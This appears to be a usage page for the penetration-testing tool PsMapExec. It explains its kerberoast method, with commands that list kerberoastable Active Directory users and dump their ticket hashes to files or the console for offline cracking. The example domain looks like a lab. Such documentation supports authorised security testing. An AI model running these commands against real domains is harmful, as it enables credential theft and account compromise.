# Kerberoast

PsMapExec will now perform kerberoasting. By default, all kerberoastable users are obtained and written to file. All hashes are output to file and split into each file depending on the associated encryption.

Output is stored in: $PWD\PME\Kerberoast

### 1) Obtain all Kerberoastable users from target domain

    PsMapExec -Method kerberoast -Domain north.sevenkingdoms.local

### 2) Single user specification

    PsMapExec -Method Kerberoast -ShowOutput -Option Kerberoast:USER

# Optional Parameters

### 1) Set the Domain for which to run against

    -Domain domain.local

### 2) Specify a single user to roast than all candidate users

    -Option Kerberoast:USER

### 3) Displays hash output to the console

    -ShowOutput

